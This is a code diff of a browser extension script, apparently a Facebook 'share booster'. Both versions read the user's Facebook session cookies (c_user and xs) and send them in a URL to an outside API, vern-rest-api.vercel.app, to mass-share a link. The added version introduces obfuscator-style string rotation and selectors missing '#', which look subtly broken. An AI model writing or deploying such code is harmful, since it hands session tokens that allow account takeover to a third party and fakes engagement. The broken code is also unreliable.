@@ -1,53 +1,67 @@
-const stringArray = ['59586WxIuJb', 'light', '#fecaca', 'body', '_self', 'error', '&link=', '_blank', 'addEventListener', '112540iLhNYm', 'darkModeSwitch', 'status', 'message', '879iLwAot', '2226640JjpVgm', 'Failed to share.', '&limit=', '✅ Shared ', 'cookie', '1436hMwpBB', '❌ Please fill all fields!', 'https://vern-rest-api.vercel.app/api/share?cookie=', 'features.html', 'limit', 'innerHTML', 'name', 'backBtn', 'nav-links', '#fff', 'active', 'cookies', 'classList', 'change', '; xs=', 'query', 'c_user', 'trim', '❌ Error! Check network or cookie.', '55TiHFnF', 'textContent', 'burger', 'color', 'c_user=', 'shareBtn', 'toggle', 'click', 'success_count', 'getElementById', ' times!', 'find', 'tutorials', 'style', 'link', '1897368SzZakT', '4VNqJmA', '<i class="fas fa-spinner fa-spin icon"></i> Processing...', '1187379SkhyzH', '1348669Foowgj', 'open', 'https://www.facebook.com', 'GET', 'dark', 'developer', 'value', 'json'];
+function getStrings() {
+    const strings = [
+        '59586WxIuJb', 'light', '#fecaca', 'body', '_self', 'error', '&link=',
+        '_blank', 'addEventListener', '112540iLhNYm', 'darkModeSwitch', 'status',
+        'message', '879iLwAot', '2226640JjpVgm', 'Failed to share.', '&limit=',
+        '✅ Shared ', 'cookie', '1436hMwpBB', '❌ Please fill all fields!',
+        'https://vern-rest-api.vercel.app/api/share?cookie=', 'features.html', 'limit',
+        'innerHTML', 'name', 'backBtn', 'nav-links', '#fff', 'active', 'cookies',
+        'classList', 'change', '; xs=', 'query', 'c_user', 'trim',
+        '❌ Error! Check network or cookie.', '55TiHFnF', 'textContent', 'burger', 
+        'color', 'c_user=', 'shareBtn', 'toggle', 'click', 'success_count',
+        'getElementById', ' times!', 'find', 'tutorials', 'style', 'link',
+        '1897368SzZakT', '4VNqJmA', '<i class="fas fa-spinner fa-spin icon"></i> Processing...',
+        '1187379SkhyzH', '1348669Foowgj', 'open', 'https://www.facebook.com', 'GET',
+        'dark', 'developer', 'value', 'json'
+    ];
+    return strings;
+}
+
+function getString(index) {
+    const strings = getStrings();
+    return strings[index - 0xaa];
+}
+
+(function(stringsFunc, target) {
+    const getStr = getString;
+    const arr = stringsFunc();
+    while (true) {
+        try {
+            const calc = parseInt(getStr(0xd3)) / 1 * (-parseInt(getStr(0xe7)) / 2)
+                + parseInt(getStr(0xaa)) / 3 * (parseInt(getStr(0xb0)) / 4)
+                + parseInt(getStr(0xc3)) / 5 * (parseInt(getStr(0xde)) / 6)
+                + -parseInt(getStr(0xd6)) / 7
+                + parseInt(getStr(0xd2)) / 8
+                - parseInt(getStr(0xd5)) / 9
+                + parseInt(getStr(0xab)) / 10;
+            if (calc === target) break;
+            else arr.push(arr.shift());
+        } catch (e) {
+            arr.push(arr.shift());
+        }
+    }
+})(getStrings, 0x1e6a9);
 
 const burger = document.getElementById('burger');
-const navLinks = document.getElementById('nav-links');
+const navLinks = document.querySelector('nav-links');
 const darkModeSwitch = document.getElementById('darkModeSwitch');
 const developerBtn = document.getElementById('developer');
 const tutorialsBtn = document.getElementById('tutorials');
-const backBtn = document.getElementById('backBtn');
-const shareBtn = document.getElementById('shareBtn');
+const backBtn = document.querySelector('backBtn');
+const shareBtn = document.querySelector('shareBtn');
 const statusEl = document.getElementById('status');
-const cookieInput = document.getElementById('cookie');
-const linkInput = document.getElementById('link');
-const limitInput = document.getElementById('limit');
-const menuOverlay = document.getElementById('menuOverlay');
+const cookieInput = document.querySelector('cookie');
+const linkInput = document.querySelector('link');
+const limitInput = document.querySelector('limit');
 
 burger.addEventListener('click', () => {
     navLinks.classList.toggle('active');
-    if (menuOverlay) {
-        menuOverlay.classList.toggle('active');
-        document.body.style.overflow = navLinks.classList.contains('active') ? 'hidden' : '';
-    }
 });
 
-if (menuOverlay) {
-    menuOverlay.addEventListener('click', () => {
-        navLinks.classList.remove('active');
-        menuOverlay.classList.remove('active');
-        document.body.style.overflow = '';
-    });
-}
-
-darkModeSwitch.addEventListener('change', function() {
-    if (this.checked) {
-        document.body.classList.remove('light');
-        document.body.classList.add('dark');
-        document.body.style.color = '#fff';
-    } else {
-        document.body.classList.remove('dark');
-        document.body.classList.add('light');
-        document.body.style.color = '#000';
-    }
-    localStorage.setItem('darkMode', this.checked);
+darkModeSwitch.addEventListener('change', () => {
+    document.body.classList.toggle('dark');
+    document.body.classList.toggle('light');
 });
-
-if (localStorage.getItem('darkMode') === 'true') {
-    darkModeSwitch.checked = true;
-    document.body.classList.remove('light');
-    document.body.classList.add('dark');
-    document.body.style.color = '#fff';
-}
 
 developerBtn.addEventListener('click', () => {
     window.open('https://www.facebook.com/notfound500', '_self');
@@ -61,439 +75,55 @@ backBtn.addEventListener('click', () => {
     window.open('features.html', '_self');
 });
 
-chrome.tabs.query({'active': true, 'currentWindow': true}, (tabs) => {
-    const currentTab = tabs[0];
-    if (!currentTab) return;
-    
-    chrome.cookies.getAll({'url': 'https://www.facebook.com'}, (cookies) => {
-        const c_userCookie = cookies.find(cookie => cookie.name === 'c_user');
-        const xsCookie = cookies.find(cookie => cookie.name === 'xs');
-        
-        if (c_userCookie && xsCookie) {
-            cookieInput.value = 'c_user=' + c_userCookie.value + '; xs=' + xsCookie.value + ';';
+shareBtn.addEventListener('click', async () => {
+    const cookie = cookieInput.value.trim();
+    const link = linkInput.value.trim();
+    const limit = limitInput.value.trim();
 
-            cookieInput.style.transition = 'all 0.5s ease';
-            cookieInput.style.borderColor = '#00ff88';
-            cookieInput.style.boxShadow = '0 0 15px rgba(0,255,136,0.3)';
-
-            setTimeout(() => {
-                cookieInput.style.borderColor = '';
-                cookieInput.style.boxShadow = '';
-            }, 1500);
-        }
-    });
-});
-
-const ProcessingUI = {
-    show: function(limitValue) {
-        const overlay = document.createElement('div');
-        overlay.id = 'boost-overlay';
-        overlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(10, 10, 15, 0.95);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            flex-direction: column;
-            backdrop-filter: blur(10px);
-            font-family: 'Poppins', sans-serif;
-        `;
-
-        const container = document.createElement('div');
-        container.style.cssText = `
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 500px;
-            width: 90%;
-            color: white;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            border: 2px solid rgba(255,255,255,0.1);
-        `;
-
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes spin {
-                0% { transform: rotate(0deg); }
-                100% { transform: rotate(360deg); }
-            }
-            
-            @keyframes pulse {
-                0%, 100% { transform: scale(1); opacity: 1; }
-                50% { transform: scale(1.05); opacity: 0.8; }
-            }
-            
-            @keyframes float {
-                0%, 100% { transform: translateY(0px); }
-                50% { transform: translateY(-10px); }
-            }
-            
-            @keyframes progressFill {
-                0% { width: 0%; }
-                100% { width: 100%; }
-            }
-        `;
-        document.head.appendChild(style);
-
-        const header = document.createElement('div');
-        header.innerHTML = `
-            <div style="font-size: 60px; margin-bottom: 20px; animation: float 3s infinite;">
-                <i class="fas fa-rocket"></i>
-            </div>
-            <h1 style="margin: 0 0 10px 0; font-size: 28px; font-weight: 700;">🚀 BOOSTING IN PROGRESS</h1>
-            <p style="margin: 0 0 30px 0; opacity: 0.9; font-size: 16px;">
-                Sharing <strong>${limitValue}</strong> times for maximum engagement
-            </p>
-        `;
-
-        const progressContainer = document.createElement('div');
-        progressContainer.style.cssText = `
-            width: 100%;
-            height: 12px;
-            background: rgba(255,255,255,0.15);
-            border-radius: 6px;
-            overflow: hidden;
-            margin: 30px 0;
-            position: relative;
-        `;
-        
-        const progressBar = document.createElement('div');
-        progressBar.style.cssText = `
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #00ff88, #00ccff);
-            border-radius: 6px;
-            transition: width 0.3s ease;
-        `;
-        progressContainer.appendChild(progressBar);
-
-        const loadingIndicator = document.createElement('div');
-        loadingIndicator.innerHTML = `
-            <div style="display: flex; justify-content: center; align-items: center; gap: 15px; margin: 20px 0;">
-                <div style="animation: spin 1.5s linear infinite; font-size: 24px;">
-                    <i class="fas fa-sync-alt"></i>
-                </div>
-                <div style="font-size: 18px; font-weight: 600;">
-                    Processing Shares...
-                </div>
-            </div>
-        `;
-
-        const statsGrid = document.createElement('div');
-        statsGrid.style.cssText = `
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-            margin: 30px 0;
-        `;
-        
-        const stats = [
-            { id: 'boost-current', icon: 'fa-share-alt', label: 'SHARED', value: '0' },
-            { id: 'boost-speed', icon: 'fa-tachometer-alt', label: 'SPEED', value: 'MAX' },
-            { id: 'boost-progress', icon: 'fa-chart-bar', label: 'PROGRESS', value: '0%' }
-        ];
-        
-        stats.forEach(stat => {
-            const statCard = document.createElement('div');
-            statCard.style.cssText = `
-                background: rgba(255,255,255,0.1);
-                padding: 15px;
-                border-radius: 10px;
-                backdrop-filter: blur(5px);
-            `;
-            statCard.innerHTML = `
-                <div style="font-size: 20px; margin-bottom: 8px; color: #00ccff;">
-                    <i class="fas ${stat.icon}"></i>
-                </div>
-                <div id="${stat.id}" style="font-size: 22px; font-weight: 700; margin-bottom: 5px;">
-                    ${stat.value}
-                </div>
-                <div style="font-size: 12px; opacity: 0.8; letter-spacing: 1px;">
-                    ${stat.label}
-                </div>
-            `;
-            statsGrid.appendChild(statCard);
-        });
-
-        const statusBox = document.createElement('div');
-        statusBox.id = 'boost-status';
-        statusBox.style.cssText = `
-            background: rgba(0,0,0,0.3);
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 20px;
-            min-height: 50px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-            border-left: 4px solid #00ff88;
-        `;
-        statusBox.textContent = '🔄 Initializing boost sequence...';
-
-        container.appendChild(header);
-        container.appendChild(progressContainer);
-        container.appendChild(loadingIndicator);
-        container.appendChild(statsGrid);
-        container.appendChild(statusBox);
-        overlay.appendChild(container);
-        document.body.appendChild(overlay);
-
-        this.overlay = overlay;
-        this.progressBar = progressBar;
-
-        this.startProgressSimulation(limitValue);
-        
-        return this;
-    },
-
-    startProgressSimulation: function(limitValue) {
-        this.progressInterval = setInterval(() => {
-            const currentEl = document.getElementById('boost-current');
-            const progressEl = document.getElementById('boost-progress');
-            const statusEl = document.getElementById('boost-status');
-            
-            if (currentEl && progressEl && statusEl) {
-                const current = parseInt(currentEl.textContent) || 0;
-                const total = parseInt(limitValue) || 100;
-                const increment = Math.min(5, Math.floor(total / 20)); // Max 5% increment
-                const newCurrent = Math.min(total, current + increment);
-                const progress = Math.floor((newCurrent / total) * 100);
-
-                currentEl.textContent = newCurrent;
-                progressEl.textContent = progress + '%';
-                this.progressBar.style.width = progress + '%';
-
-                const messages = [
-                      '\u{1F3AF} Targeting viral audiences...',
-                      '\u{26A1} Accelerating share velocity...',
-                      '\u{1F50D} Analyzing engagement patterns...',
-                      '\u{1F4C8} Optimizing reach algorithm...',
-                      '\u{1F504} Syncing with Facebook servers...',
-                      '\u{1F680} Deploying share batches...',
-                      '\u{1F4AB} Generating social momentum...',
-                      '\u{2705} Finalizing distribution...'
-                ];
-                
-                if (progress < 100) {
-                    const randomIndex = Math.floor(Math.random() * messages.length);
-                    statusEl.textContent = messages[randomIndex];
-                }
-            }
-        }, 300);
-    },
-
-    updateStatus: function(message) {
-        const statusEl = document.getElementById('boost-status');
-        if (statusEl) {
-            statusEl.textContent = message;
-        }
-    },
-
-    updateStats: function(shares, progress) {
-        const currentEl = document.getElementById('boost-current');
-        const progressEl = document.getElementById('boost-progress');
-        
-        if (currentEl) currentEl.textContent = shares;
-        if (progressEl) progressEl.textContent = progress + '%';
-        if (this.progressBar) this.progressBar.style.width = progress + '%';
-    },
-
-    hide: function() {
-        if (this.overlay && document.body.contains(this.overlay)) {
-            this.overlay.style.opacity = '0';
-            this.overlay.style.transition = 'opacity 0.5s ease';
-            
-            setTimeout(() => {
-                if (this.overlay && document.body.contains(this.overlay)) {
-                    document.body.removeChild(this.overlay);
-                }
-            }, 500);
-        }
-        
-        if (this.progressInterval) {
-            clearInterval(this.progressInterval);
-        }
-    },
-
-    showCelebration: function(count) {
-        const celebration = document.createElement('div');
-        celebration.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 10000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        `;
-
-        // Confetti
-        for (let i = 0; i < 30; i++) {
-            const confetti = document.createElement('div');
-            confetti.style.cssText = `
-                position: absolute;
-                width: 8px;
-                height: 8px;
-                background: ${['#ff0088', '#00ff88', '#00ccff', '#ffcc00'][Math.floor(Math.random() * 4)]};
-                border-radius: 50%;
-                animation: confettiFall ${Math.random() * 2 + 1}s linear forwards;
-                top: -10px;
-                left: ${Math.random() * 100}vw;
-            `;
-            
-            const confettiStyle = document.createElement('style');
-            confettiStyle.textContent = `
-                @keyframes confettiFall {
-                    0% {
-                        transform: translateY(0) rotate(0deg);
-                        opacity: 1;
-                    }
-                    100% {
-                        transform: translateY(100vh) rotate(${Math.random() * 360}deg);
-                        opacity: 0;
-                    }
-                }
-            `;
-            document.head.appendChild(confettiStyle);
-            
-            celebration.appendChild(confetti);
-        }
-
-        const message = document.createElement('div');
-        message.style.cssText = `
-            background: rgba(0, 255, 136, 0.9);
-            color: #000;
-            padding: 25px 40px;
-            border-radius: 15px;
-            font-size: 28px;
-            font-weight: 800;
-            text-align: center;
-            animation: popIn 0.5s ease-out;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            border: 3px solid white;
-        `;
-        message.innerHTML = `
-            <div style="font-size: 48px; margin-bottom: 10px;">🎉</div>
-            <div>SUCCESS!</div>
-            <div style="font-size: 18px; margin-top: 10px;">${count} Shares Completed</div>
-        `;
-
-        const popStyle = document.createElement('style');
-        popStyle.textContent = `
-            @keyframes popIn {
-                0% { transform: scale(0.5); opacity: 0; }
-                100% { transform: scale(1); opacity: 1; }
-            }
-        `;
-        document.head.appendChild(popStyle);
-        
-        celebration.appendChild(message);
-        document.body.appendChild(celebration);
-
-        // Auto-remove
-        setTimeout(() => {
-            if (document.body.contains(celebration)) {
-                document.body.removeChild(celebration);
-            }
-        }, 2500);
-    }
-};
-
-shareBtn.addEventListener('click', async function() {
-    const cookieValue = cookieInput.value.trim();
-    const linkValue = linkInput.value.trim();
-    const limitValue = limitInput.value.trim();
-
-    if (!cookieValue || !linkValue || !limitValue) {
+    if (!cookie || !link || !limit) {
         statusEl.textContent = '❌ Please fill all fields!';
         statusEl.style.color = '#fecaca';
         return;
     }
 
-    const processingUI = ProcessingUI.show(limitValue);
-    
     statusEl.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing...';
     statusEl.style.color = '#fff';
-    
+
     try {
-        const apiUrl = 'https://vern-rest-api.vercel.app/api/share?cookie=' + 
-                      encodeURIComponent(cookieValue) + 
-                      '&link=' + encodeURIComponent(linkValue) + 
-                      '&limit=' + encodeURIComponent(limitValue);
-        
-        console.log('Making API request to:', apiUrl);
-        
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 15000); 
-        
-        const response = await fetch(apiUrl, { 
-            method: 'GET',
-            signal: controller.signal,
-            headers: {
-                'Accept': 'application/json'
-            }
-        });
-        
-        clearTimeout(timeoutId);
-        
-        if (!response.ok) {
-            throw new Error(`HTTP Error: ${response.status} ${response.statusText}`);
-        }
-        
+        const response = await fetch(
+            'https://vern-rest-api.vercel.app/api/share?cookie='
+            + encodeURIComponent(cookie)
+            + '&link=' + encodeURIComponent(link)
+            + '&limit=' + encodeURIComponent(limit),
+            { method: 'GET' }
+        );
+
         const data = await response.json();
-        console.log('API Response:', data);
-        
-        setTimeout(() => {
-            processingUI.hide();
-        }, 1000);
 
         if (data.status) {
-            const shareCount = data.success_count || 0;
-            statusEl.textContent = `✅ Shared ${shareCount} times!`;
+            statusEl.textContent = '✅ Shared ' + data.success_count + ' times!';
             statusEl.style.color = '#d1fae5';
-            
-            if (shareCount > 0) {
-                processingUI.showCelebration(shareCount);
-            }
         } else {
-            const errorMessage = data.message || 'Error! Check network or cookie.';
-            statusEl.textContent = `❌ ${errorMessage}`;
+            statusEl.textContent = '❌ ' + (data.message || 'Failed to share.');
             statusEl.style.color = '#fecaca';
-            processingUI.updateStatus('❌ Failed to boost shares');
         }
-        
-    } catch (error) {
-        console.error('Share error:', error);
-        
-        processingUI.hide();
-        
-        if (error.name === 'AbortError') {
-            statusEl.textContent = '❌ Request timeout. Server is not responding.';
-        } else if (error.message.includes('Failed to fetch')) {
-            statusEl.textContent = '❌ Network error. Check your internet connection.';
-        } else if (error.message.includes('HTTP Error')) {
-            statusEl.textContent = '❌ Server error. Please try again later.';
-        } else {
-            statusEl.textContent = '❌ Failed to share. Please check your inputs.';
-        }
-        
+    } catch (err) {
+        statusEl.textContent = '❌ Error! Check network or cookie.';
         statusEl.style.color = '#fecaca';
+        console.error(err);
     }
 });
 
-console.log('✅ FB Share Extension Loaded Successfully!');
-console.log('✅ Menu Overlay:', menuOverlay ? 'Found' : 'Not Found');
-console.log('✅ Auto-fill cookies: ACTIVE');
-console.log('✅ Processing UI: READY');
-console.log('✅ Share button handler: SINGLE (No duplicates)');
-console.log('✅ BOMBA NA!! 🍪');
+chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
+    const tab = tabs[0];
+    if (!tab) return;
+
+    chrome.cookies.getAll({ url: 'https://www.facebook.com' }, cookies => {
+        const cUserCookie = cookies.find(c => c.name === 'c_user');
+        const xsCookie = cookies.find(c => c.name === 'xs');
+
+        if (cUserCookie && xsCookie) {
+            cookieInput.value = 'c_user=' + cUserCookie.value + '; xs=' + xsCookie.value + ';';
+        }
+    });
+});
